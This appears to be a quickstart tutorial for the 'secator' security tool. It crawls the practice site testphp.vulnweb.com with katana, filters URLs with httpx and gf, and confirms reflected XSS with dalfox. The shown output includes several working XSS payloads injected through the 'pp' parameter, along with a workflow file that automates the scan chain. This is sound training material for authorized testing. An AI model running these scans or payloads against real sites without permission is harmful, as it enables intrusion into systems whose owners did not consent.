# 5 minutes secator session

This quickstart will be focused on using `secator` to find vulnerabilities on the website [http://testphp.vulnweb.com](http://testphp.vulnweb.com).

We will start by using simple `secator` tasks, and then show how to use workflows to considerably speed up the session.

***

## Using tasks

<details>

<summary>Step 1: Run <code>katana</code> on the root URL</summary>

We'll start by using a crawler to find some URLs that could be interesting to exploit for vulnerabiliites. We most often use `katana`, a tool by ProjectDiscovery.

We'll save our results to a `.txt` file:

<pre class="language-bash"><code class="lang-bash"><strong>secator x katana http://testphp.vulnweb.com -o txt
</strong>                         __            
   ________  _________ _/ /_____  _____
  / ___/ _ \/ ___/ __ `/ __/ __ \/ ___/
 (__  /  __/ /__/ /_/ / /_/ /_/ / /    
/____/\___/\___/\__,_/\__/\____/_/     v0.0.1

                    freelabz.com

[13:34:53] katana -silent -jc -js-crawl -known-files all -u http://testphp.vulnweb.com -json -concurrency 50                                                                                                                                _base.py:614
🔗 http://testphp.vulnweb.com [200] [Nginx:1.19.0, PHP:5.6.40, Ubuntu, DreamWeaver]
🔗 http://testphp.vulnweb.com/high [404] [Nginx:1.19.0]
🔗 http://testphp.vulnweb.com/index.php
🔗 http://testphp.vulnweb.com/style.css [200] [Nginx:1.19.0]
🔗 http://testphp.vulnweb.com/privacy.php [404] [PHP:5.6.40, Ubuntu, Nginx:1.19.0]
🔗 http://testphp.vulnweb.com/AJAX/index.php [200] [Nginx:1.19.0, PHP:5.6.40, Ubuntu]
🔗 http://testphp.vulnweb.com/categories.php [200] [Nginx:1.19.0, PHP:5.6.40, Ubuntu, DreamWeaver]
🔗 http://testphp.vulnweb.com/cart.php [200] [PHP:5.6.40, Ubuntu, DreamWeaver, Nginx:1.19.0]
🔗 http://testphp.vulnweb.com/artists.php [200] [DreamWeaver, Nginx:1.19.0, PHP:5.6.40, Ubuntu]
🔗 http://testphp.vulnweb.com/Mod_Rewrite_Shop/ [200] [Nginx:1.19.0, PHP:5.6.40, Ubuntu]
🔗 http://testphp.vulnweb.com/hpp/ [200] [Nginx:1.19.0, PHP:5.6.40, Ubuntu]
🔗 http://testphp.vulnweb.com/disclaimer.php [200] [DreamWeaver, Nginx:1.19.0, PHP:5.6.40, Ubuntu]
🔗 http://testphp.vulnweb.com/login.php [200] [DreamWeaver, Nginx:1.19.0, PHP:5.6.40, Ubuntu]
🔗 http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php [200] [Ubuntu, Nginx:1.19.0, PHP:5.6.40]
🔗 http://testphp.vulnweb.com/guestbook.php [200] [Nginx:1.19.0, PHP:5.6.40, Ubuntu, DreamWeaver]
🔗 http://testphp.vulnweb.com/userinfo.php
🔗 http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/ [200] [Nginx:1.19.0, PHP:5.6.40, Ubuntu]
🔗 http://testphp.vulnweb.com/comment.php?aid=3 [200] [Ubuntu, Nginx:1.19.0, PHP:5.6.40]
🔗 http://testphp.vulnweb.com/search.php?test=query [200] [DreamWeaver, Nginx:1.19.0, PHP:5.6.40, Ubuntu]
🔗 http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/ [200] [Nginx:1.19.0, PHP:5.6.40, Ubuntu]
🔗 http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/ [200] [Nginx:1.19.0, PHP:5.6.40, Ubuntu]
🔗 http://testphp.vulnweb.com/Templates/high
🔗 http://testphp.vulnweb.com/comment.php?aid=2
🔗 http://testphp.vulnweb.com/artists.php?artist=1 [200] [DreamWeaver, Nginx:1.19.0, PHP:5.6.40, Ubuntu]
🔗 http://testphp.vulnweb.com/hpp/?pp=12 [200] [Nginx:1.19.0, PHP:5.6.40, Ubuntu]
🔗 http://testphp.vulnweb.com/signup.php [200] [Nginx:1.19.0, PHP:5.6.40, Ubuntu, DreamWeaver]
🔗 http://testphp.vulnweb.com/comment.php?aid=1
🔗 http://testphp.vulnweb.com/AJAX/showxml.php [200] [Nginx:1.19.0, PHP:5.6.40, Ubuntu]
🔗 http://testphp.vulnweb.com/AJAX/styles.css [200] [Nginx:1.19.0]
🔗 http://testphp.vulnweb.com/artists.php?artist=3 [200] [PHP:5.6.40, Ubuntu, DreamWeaver, Nginx:1.19.0]
🔗 http://testphp.vulnweb.com/listproducts.php?cat=3 [200] [Nginx:1.19.0, PHP:5.6.40, Ubuntu, DreamWeaver]
🔗 http://testphp.vulnweb.com/listproducts.php?cat=2 [200] [Nginx:1.19.0, PHP:5.6.40, Ubuntu, DreamWeaver]
🔗 http://testphp.vulnweb.com/showimage.php?file= [200] [Nginx:1.19.0, PHP:5.6.40, Ubuntu]
🔗 http://testphp.vulnweb.com/artists.php?artist=2 [200] [Nginx:1.19.0, PHP:5.6.40, Ubuntu, DreamWeaver]
🔗 http://testphp.vulnweb.com/listproducts.php?cat=4
🔗 http://testphp.vulnweb.com/listproducts.php?cat=1 [200] [Nginx:1.19.0, PHP:5.6.40, Ubuntu, DreamWeaver]
🗄 Saved TXT reports to 
   • /home/vagrant/.secator/reports/default/tasks/task_katana_target_2023_07_04-01_33_13_152782_PM.txt
   • /home/vagrant/.secator/reports/default/tasks/task_katana_url_2023_07_04-01_33_13_152782_PM.txt
</code></pre>

`katana` found some pretty interesting results, including some PHP files that could potentially be vulnerable.

</details>

<details>

<summary>Step 2: Run <code>httpx</code> on found URLs to alive URLs</summary>

Crawlers usually find URLs from HTML response bodies, which means we have no ideas if those URLs will actually respond to HTTP requests or not.

In order to filter only the URLs that will give a valid HTTP status code, we can use `httpx` on the previous results (txt file).\
\
We'll add some rate limiting (`-rl`) in order to respect the server and not DDoS it for no reason.&#x20;

We want to keep only some HTTP codes (`-mc`) for instance `200`, `301`, and `500` in case we have there are errors we can take advantage of:&#x20;

```bash
secator x httpx /home/vagrant/.secator/reports/default/tasks/task_katana_target_2023_07_04-01_33_13_152782_PM.txt -rl 10 -mc 200,301,500

                         __            
   ________  _________ _/ /_____  _____
  / ___/ _ \/ ___/ __ `/ __/ __ \/ ___/
 (__  /  __/ /__/ /_/ / /_/ /_/ / /    
/____/\___/\___/\__,_/\__/\____/_/     v0.0.1

                    freelabz.com

[13:19:35] httpx -silent -td -asn -cdn -l /tmp/httpx_2023_07_04-01_19_35_686343_PM.txt -json -threads 50 -match-code 200,301,500                                                                                                            _base.py:614
🔗 http://testphp.vulnweb.com/showimage.php?file [200] [nginx/1.19.0] [Nginx:1.19.0, PHP:5.6.40, Ubuntu] [image/jpeg] [196]
🔗 http://testphp.vulnweb.com/hpp [200] [HTTP Parameter Pollution Example] [nginx/1.19.0] [Nginx:1.19.0, PHP:5.6.40, Ubuntu] [text/html] [203]
🔗 http://testphp.vulnweb.com/cart.php [200] [you cart] [nginx/1.19.0] [DreamWeaver, Nginx:1.19.0, PHP:5.6.40, Ubuntu] [text/html] [4903]
🔗 http://testphp.vulnweb.com/categories.php [200] [picture categories] [nginx/1.19.0] [DreamWeaver, Nginx:1.19.0, PHP:5.6.40, Ubuntu] [text/html] [6115]
🔗 http://testphp.vulnweb.com/artists.php?artist=3 [200] [artists] [nginx/1.19.0] [DreamWeaver, Nginx:1.19.0, PHP:5.6.40, Ubuntu] [text/html] [6193]
🔗 http://testphp.vulnweb.com/comment.php?aid=3 [200] [comment on artist] [nginx/1.19.0] [Nginx:1.19.0, PHP:5.6.40, Ubuntu] [text/html] [1252]
🔗 http://testphp.vulnweb.com/comment.php?aid=2 [200] [comment on artist] [nginx/1.19.0] [Nginx:1.19.0, PHP:5.6.40, Ubuntu] [text/html] [1252]
🔗 http://testphp.vulnweb.com/AJAX/showxml.php [200] [nginx/1.19.0] [Nginx:1.19.0, PHP:5.6.40, Ubuntu] [text/html] [11]
🔗 http://testphp.vulnweb.com/style.css [200] [nginx/1.19.0] [Nginx:1.19.0] [text/css] [5482]
🔗 http://testphp.vulnweb.com/artists.php?artist=1 [200] [artists] [nginx/1.19.0] [DreamWeaver, Nginx:1.19.0, PHP:5.6.40, Ubuntu] [text/html] [6251]
🔗 http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php [200] [Document titleg] [nginx/1.19.0] [Nginx:1.19.0, PHP:5.6.40, Ubuntu] [text/html] [4697]
🔗 http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3 [200] [nginx/1.19.0] [Nginx:1.19.0, PHP:5.6.40, Ubuntu] [text/html] [313]
🔗 http://testphp.vulnweb.com/AJAX/styles.css [200] [nginx/1.19.0] [Nginx:1.19.0] [text/css] [562]
🔗 http://testphp.vulnweb.com/hpp/?pp=12 [200] [HTTP Parameter Pollution Example] [nginx/1.19.0] [Nginx:1.19.0, PHP:5.6.40, Ubuntu] [text/html] [383]
🔗 http://testphp.vulnweb.com/login.php [200] [login page] [nginx/1.19.0] [DreamWeaver, Nginx:1.19.0, PHP:5.6.40, Ubuntu] [text/html] [5523]
🔗 http://testphp.vulnweb.com/guestbook.php [200] [guestbook] [nginx/1.19.0] [DreamWeaver, Nginx:1.19.0, PHP:5.6.40, Ubuntu] [text/html] [5390]
🔗 http://testphp.vulnweb.com/signup.php [200] [signup] [nginx/1.19.0] [DreamWeaver, Nginx:1.19.0, PHP:5.6.40, Ubuntu] [text/html] [6033]
🔗 http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1 [200] [nginx/1.19.0] [Nginx:1.19.0, PHP:5.6.40, Ubuntu] [text/html] [319]
🔗 http://testphp.vulnweb.com/search.php?test=query [200] [search] [nginx/1.19.0] [DreamWeaver, Nginx:1.19.0, PHP:5.6.40, Ubuntu] [text/html] [4732]
🔗 http://testphp.vulnweb.com/listproducts.php?cat=3 [200] [pictures] [nginx/1.19.0] [DreamWeaver, Nginx:1.19.0, PHP:5.6.40, Ubuntu] [text/html] [4699]
🔗 http://testphp.vulnweb.com/AJAX/index.php [200] [ajax test] [nginx/1.19.0] [Nginx:1.19.0, PHP:5.6.40, Ubuntu] [text/html] [4236]
🔗 http://testphp.vulnweb.com/disclaimer.php [200] [disclaimer] [nginx/1.19.0] [DreamWeaver, Nginx:1.19.0, PHP:5.6.40, Ubuntu] [text/html] [5524]
🔗 http://testphp.vulnweb.com/artists.php?artist=2 [200] [artists] [nginx/1.19.0] [DreamWeaver, Nginx:1.19.0, PHP:5.6.40, Ubuntu] [text/html] [6193]
🔗 http://testphp.vulnweb.com/listproducts.php?cat=4 [200] [pictures] [nginx/1.19.0] [DreamWeaver, Nginx:1.19.0, PHP:5.6.40, Ubuntu] [text/html] [4699]
🔗 http://testphp.vulnweb.com/artists.php [200] [artists] [nginx/1.19.0] [DreamWeaver, Nginx:1.19.0, PHP:5.6.40, Ubuntu] [text/html] [5328]
🔗 http://testphp.vulnweb.com/listproducts.php?cat=2 [200] [pictures] [nginx/1.19.0] [DreamWeaver, Nginx:1.19.0, PHP:5.6.40, Ubuntu] [text/html] [5311]
🔗 http://testphp.vulnweb.com/Mod_Rewrite_Shop [200] [nginx/1.19.0] [Nginx:1.19.0, PHP:5.6.40, Ubuntu] [text/html] [975]
🔗 http://testphp.vulnweb.com/listproducts.php?cat=1 [200] [pictures] [nginx/1.19.0] [DreamWeaver, Nginx:1.19.0, PHP:5.6.40, Ubuntu] [text/html] [7880]
🔗 http://testphp.vulnweb.com/comment.php?aid=1 [200] [comment on artist] [nginx/1.19.0] [Nginx:1.19.0, PHP:5.6.40, Ubuntu] [text/html] [1252]
🔗 http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2 [200] [nginx/1.19.0] [Nginx:1.19.0, PHP:5.6.40, Ubuntu] [text/html] [279]
🔗 http://testphp.vulnweb.com [200] [Home of Acunetix Art] [nginx/1.19.0] [DreamWeaver, Nginx:1.19.0, PHP:5.6.40, Ubuntu] [text/html] [4958]
🔗 http://testphp.vulnweb.com/index.php [200] [Home of Acunetix Art] [nginx/1.19.0] [DreamWeaver, Nginx:1.19.0, PHP:5.6.40, Ubuntu] [text/html] [4958]
🗄 Saved TXT reports to 
   • /home/vagrant/.secator/reports/default/tasks/task_httpx_target_2023_07_04-01_34_22_081275_PM.txt
   • /home/vagrant/.secator/reports/default/tasks/task_httpx_url_2023_07_04-01_34_22_081275_PM.txt
```

</details>

<details>

<summary>Step 3: Run <code>gf</code> on found URLs</summary>

`gf` allows to run patterns on URLs, we can use it to quickly detect potential interesting URLs including XSS, LFIs, SSRFs, RCEs, Interesting params, or Insecure Direct Object references.\
Let's hunt for potential XSS:

<pre><code>secator x gf --pattern xss /home/vagrant/.secator/reports/default/tasks/task_httpx_target_2023_07_04-01_34_22_081275_PM.tx
<strong>🏷️ [xss] http://testphp.vulnweb.com/comment.php?aid=1 []
</strong>🏷️ [xss] http://testphp.vulnweb.com/comment.php?aid=2 []
🏷️ [xss] http://testphp.vulnweb.com/comment.php?aid=3 []
🏷️ [xss] http://testphp.vulnweb.com/hpp/?pp=12 []
</code></pre>

Mmmh, it seems like we might have some interesting XSS targets here. Let's use `dalfox` to find out !

</details>

<details>

<summary>Step 4: Run <code>dalfox</code> on potential XSS links</summary>

`dalfox` is a pretty thorough XSS checker, let's run it on the targets we've identified:

```
secator x dalfox http://testphp.vulnweb.com/hpp/?pp=12

                         __            
   ________  _________ _/ /_____  _____
  / ___/ _ \/ ___/ __ `/ __/ __ \/ ___/
 (__  /  __/ /__/ /_/ / /_/ /_/ / /    
/____/\___/\___/\__,_/\__/\____/_/     v0.0.1

                    freelabz.com

[13:41:28] dalfox --silence url 'http://testphp.vulnweb.com/hpp/?pp=12' --format json --worker 50                                                                                                                                           _base.py:614
🚨 [Verified XSS] [high] http://testphp.vulnweb.com/hpp/ [CWE-83] [inject_type:inATTR-double(3)-URL, poc_type:plain, method:GET, 
data:http://testphp.vulnweb.com/hpp/?pp=12%22id%3Dx+tabindex%3D1+style%3D%22display%3Ablock%3Btransition%3Aoutline+1s%3B%22+ontransitionend%3Dalert.apply%28null%2C1%29+class%3Ddalfox+, param:pp, payload:"id=x tabindex=1 
style="display:block;transition:outline 1s;" ontransitionend=alert.apply(null,1) class=dalfox , evidence:4 line:  ms.php?p=valid&pp=12"id=x tabindex=1 style="display:block;transition:outline 1s;, message_id:1103, message_str:Triggered XSS Payload 
(found DOM Object): pp="id=x tabindex=1 style="display:block;transition:outline 1s;" ontransitionend=alert.apply(null,1) class=dalfox ]
```

**We have found a Verified XSS !**

We could verify this XSS in our browser to validate it, but `dalfox` already gave us evidence that it works...

</details>

***

## Using a task pipe

The previous set of tasks is an example of how we usually find vulnerabilities in HTTP URLs.

In that sense, the pentester work can become really repetitive and boring and a set of tasks like this one can be automated.

Here is a `secator` pipe that can automate the previous 4 steps. Here we use the `-raw` flag to directly input URLs to the next task instead of saving results to a text file and re-using that text file in later steps:

```
secator x katana http://testphp.vulnweb.com -raw | secator x httpx -raw | secator x gf --pattern xss -fmt '{match}' | secator x dalfox
```

<details>

<summary>Command output</summary>

```
[13:50:29] katana -silent -jc -js-crawl -known-files all -u http://testphp.vulnweb.com -json -concurrency 50                                                                                                                                _base.py:614
[13:50:43] httpx -silent -td -asn -cdn -l /tmp/httpx_2023_07_04-01_50_43_044323_PM.txt -json -threads 50                                                                                                                                    _base.py:614
[13:50:49] cat /tmp/gf_2023_07_04-01_50_49_787397_PM.txt | gf xss                                                                                                                                                                           _base.py:614
[13:50:49] dalfox --silence file /tmp/dalfox_2023_07_04-01_50_49_855768_PM.txt --format json --worker 50                                                                                                                                    _base.py:614
🚨 [Verified XSS] [high] http://testphp.vulnweb.com/hpp/ [CWE-83] [inject_type:inATTR-double(3)-URL, poc_type:plain, method:GET, 
data:http://testphp.vulnweb.com/hpp/?pp=12%22%26%2339%3B%3E%3Caudio+controls+ondurationchange%3Dprompt%281%29+id%3Ddalfox%3E%3Csource+src%3D1.mp3+type%3Daudio%2Fmpeg%3E%3C%2Faudio%3E, param:pp, payload:"&#39;><audio controls 
ondurationchange=prompt(1) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>, evidence:4 line:  ms.php?p=valid&pp=12"&#39;><audio controls ondurationchange=prompt(1) id=dalfox>, message_id:1862, message_str:Triggered XSS Payload (found DOM 
Object): pp="&#39;><audio controls ondurationchange=prompt(1) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>]
```

</details>

This is already a good time improvement over the previous lengthy set of tasks.

***

## Using a workflow

Task pipes are good to quickly find things, but workflows are much better to repeat the same set of tasks over separate sets of targets, with the same input options for all tasks, while filtering final results and reacting to live results, etc...

Here is a `secator` workflow corresponding to the previous set of tasks:

{% code title="xss_finder.yaml" %}
```yaml
type: workflow
name: xss_finder
description: XSS Finder
tasks:
  katana:
    description: Crawling root URL
  httpx:
    description: Finding alive URLs
    targets_:
      - type: url
        field: url
        condition: item.status_code == 0
  gf:
    description: Identifying XSS
    targets_:
      - url.url
  dalfox:
    description: Verifying XSS
    targets_:
      - type: tag
        field: match
        condition: item.name == 'xss'
```
{% endcode %}

And here is the workflow run using `secator`:

```
secator w xss_finder.yaml http://testphp.vulnweb.com
```

<details>

<summary>Command output</summary>

```
                         __            
   ________  _________ _/ /_____  _____
  / ___/ _ \/ ___/ __ `/ __/ __ \/ ___/
 (__  /  __/ /__/ /_/ / /_/ /_/ / /    
/____/\___/\___/\__,_/\__/\____/_/     v0.0.1

                    freelabz.com

╭────── Workflow xss_finder ──────╮
│ 📜 Description: XSS Finder      │
│ 👷 Workspace: default           │
│ 🍐 Targets:                     │
│    • http://testphp.vulnweb.com │
│ 📌 Options:                     │
│    • threads: 50                │
│    • headless: False            │
│    • system_chrome: False       │
│    • follow_redirect: False     │
│    • debug_resp: False          │
│ ✉  Exporters:                   │
│    • json                       │
│    • csv                        │
╰─────────────────────────────────╯
[14:03:31] 🎉 Workflow xss_finder starting...                                                                                                                                                                                               _base.py:614

🔧 Crawling root URL ...
[14:03:32] katana -silent -jc -js-crawl -known-files all -u http://testphp.vulnweb.com -json -concurrency 50                                                                                                                                _base.py:614
🔗 http://testphp.vulnweb.com [200] [Nginx:1.19.0, Ubuntu, PHP:5.6.40, DreamWeaver]
🔗 http://testphp.vulnweb.com/high [404] [Nginx:1.19.0]
🔗 http://testphp.vulnweb.com/Mod_Rewrite_Shop/ [200] [Nginx:1.19.0, Ubuntu, PHP:5.6.40]
🔗 http://testphp.vulnweb.com/index.php
🔗 http://testphp.vulnweb.com/style.css [200] [Nginx:1.19.0]
🔗 http://testphp.vulnweb.com/guestbook.php [200] [Nginx:1.19.0, Ubuntu, PHP:5.6.40, DreamWeaver]
🔗 http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php [200] [PHP:5.6.40, Nginx:1.19.0, Ubuntu]
🔗 http://testphp.vulnweb.com/AJAX/index.php [200] [PHP:5.6.40, Nginx:1.19.0, Ubuntu]
🔗 http://testphp.vulnweb.com/login.php [200] [Nginx:1.19.0, Ubuntu, PHP:5.6.40, DreamWeaver]
🔗 http://testphp.vulnweb.com/cart.php [200] [PHP:5.6.40, Nginx:1.19.0, Ubuntu, DreamWeaver]
🔗 http://testphp.vulnweb.com/privacy.php [404] [Nginx:1.19.0, Ubuntu, PHP:5.6.40]
🔗 http://testphp.vulnweb.com/hpp/ [200] [Nginx:1.19.0, Ubuntu, PHP:5.6.40]
🔗 http://testphp.vulnweb.com/categories.php [200] [Nginx:1.19.0, Ubuntu, PHP:5.6.40, DreamWeaver]
🔗 http://testphp.vulnweb.com/artists.php [200] [Nginx:1.19.0, Ubuntu, PHP:5.6.40, DreamWeaver]
🔗 http://testphp.vulnweb.com/disclaimer.php [200] [Nginx:1.19.0, Ubuntu, PHP:5.6.40, DreamWeaver]
🔗 http://testphp.vulnweb.com/userinfo.php
🔗 http://testphp.vulnweb.com/listproducts.php?cat=3
🔗 http://testphp.vulnweb.com/comment.php?aid=1 [200] [Nginx:1.19.0, Ubuntu, PHP:5.6.40]
🔗 http://testphp.vulnweb.com/listproducts.php?cat=4 [200] [Nginx:1.19.0, Ubuntu, PHP:5.6.40, DreamWeaver]
🔗 http://testphp.vulnweb.com/comment.php?aid=3
🔗 http://testphp.vulnweb.com/artists.php?artist=2 [200] [Nginx:1.19.0, Ubuntu, PHP:5.6.40, DreamWeaver]
🔗 http://testphp.vulnweb.com/comment.php?aid=2
🔗 http://testphp.vulnweb.com/signup.php [200] [PHP:5.6.40, DreamWeaver, Nginx:1.19.0, Ubuntu]
🔗 http://testphp.vulnweb.com/artists.php?artist=3 [200] [Nginx:1.19.0, Ubuntu, PHP:5.6.40, DreamWeaver]
🔗 http://testphp.vulnweb.com/artists.php?artist=1 [200] [Ubuntu, PHP:5.6.40, DreamWeaver, Nginx:1.19.0]
🔗 http://testphp.vulnweb.com/listproducts.php?cat=1 [200] [Nginx:1.19.0, Ubuntu, PHP:5.6.40, DreamWeaver]
🔗 http://testphp.vulnweb.com/AJAX/showxml.php [200] [Nginx:1.19.0, Ubuntu, PHP:5.6.40]
🔗 http://testphp.vulnweb.com/showimage.php?file= [200] [Nginx:1.19.0, Ubuntu, PHP:5.6.40]
🔗 http://testphp.vulnweb.com/hpp/?pp=12 [200] [Ubuntu, PHP:5.6.40, Nginx:1.19.0]
🔗 http://testphp.vulnweb.com/AJAX/styles.css [200] [Nginx:1.19.0]
🔗 http://testphp.vulnweb.com/Templates/high
🔗 http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/ [200] [PHP:5.6.40, Nginx:1.19.0, Ubuntu]
🔗 http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/ [200] [PHP:5.6.40, Nginx:1.19.0, Ubuntu]
🔗 http://testphp.vulnweb.com/listproducts.php?cat=2 [200] [PHP:5.6.40, Nginx:1.19.0, Ubuntu, DreamWeaver]
🔗 http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/ [200] [PHP:5.6.40, Nginx:1.19.0, Ubuntu]
🔗 http://testphp.vulnweb.com/search.php?test=query [200] [Nginx:1.19.0, Ubuntu, DreamWeaver, PHP:5.6.40]

🔧 Finding alive URLs ...
[14:03:45] httpx -silent -td -asn -cdn -l /tmp/httpx_2023_07_04-02_03_45_807367_PM.txt -json -threads 50                                                                                                                                    _base.py:614
🔗 http://testphp.vulnweb.com/Templates/high [404] [404 Not Found] [nginx/1.19.0] [Nginx:1.19.0] [text/html] [153]
🔗 http://testphp.vulnweb.com/index.php [200] [Home of Acunetix Art] [nginx/1.19.0] [DreamWeaver, Nginx:1.19.0, PHP:5.6.40, Ubuntu] [text/html] [4958]
🔗 http://testphp.vulnweb.com/comment.php?aid=2 [200] [comment on artist] [nginx/1.19.0] [Nginx:1.19.0, PHP:5.6.40, Ubuntu] [text/html] [1252]
🔗 http://testphp.vulnweb.com/userinfo.php [302] [nginx/1.19.0] [Nginx:1.19.0, PHP:5.6.40, Ubuntu] [text/html] [14]
🔗 http://testphp.vulnweb.com/comment.php?aid=3 [200] [comment on artist] [nginx/1.19.0] [Nginx:1.19.0, PHP:5.6.40, Ubuntu] [text/html] [1252]
🔗 http://testphp.vulnweb.com/listproducts.php?cat=3 [200] [pictures] [nginx/1.19.0] [DreamWeaver, Nginx:1.19.0, PHP:5.6.40, Ubuntu] [text/html] [4699]

🔧 Identifying XSS ...
[14:03:52] cat /tmp/gf_2023_07_04-02_03_52_398624_PM.txt | gf xss                                                                                                                                                                           _base.py:614
🏷️ [xss] http://testphp.vulnweb.com/comment.php?aid=1 []
🏷️ [xss] http://testphp.vulnweb.com/comment.php?aid=2 []
🏷️ [xss] http://testphp.vulnweb.com/comment.php?aid=3 []
🏷️ [xss] http://testphp.vulnweb.com/hpp/?pp=12 []

🔧 Verifying XSS ...
[14:03:54] dalfox --silence file /tmp/dalfox_2023_07_04-02_03_52_411553_PM.txt --format json --worker 50                                                                                                                                    _base.py:614
🚨 [Verified XSS] [high] http://testphp.vulnweb.com/hpp/ [CWE-83] [inject_type:inATTR-double(3)-URL, poc_type:plain, method:GET, 
data:http://testphp.vulnweb.com/hpp/?pp=12%22onmouseenter%3Dprompt.call%28null%2C1%29+class%3Ddalfox+, param:pp, payload:"onmouseenter=prompt.call(null,1) class=dalfox , evidence:4 line:  ms.php?p=valid&pp=12"onmouseenter=prompt.call(null,1) 
class=dalfox ">link2</a><b, message_id:1540, message_str:Triggered XSS Payload (found DOM Object): pp="onmouseenter=prompt.call(null,1) class=dalfox ]


[14:04:20] 🎉 Workflow xss_finder succeeded in 48 seconds.                                                                                                                                                                                  _base.py:614
🗄 Saved JSON report to /home/vagrant/.secator/reports/default/workflows/workflow_xss_finder_2023_07_04-02_04_20_160856_PM.json
🗄 Saved CSV reports to 
   • /home/vagrant/.secator/reports/default/workflows/workflow_xss_finder_target_2023_07_04-02_04_20_160856_PM.csv
   • /home/vagrant/.secator/reports/default/workflows/workflow_xss_finder_url_2023_07_04-02_04_20_160856_PM.csv
   • /home/vagrant/.secator/reports/default/workflows/workflow_xss_finder_tag_2023_07_04-02_04_20_160856_PM.csv
   • /home/vagrant/.secator/reports/default/workflows/workflow_xss_finder_vulnerability_2023_07_04-02_04_20_160856_PM.csv

```

</details>

***
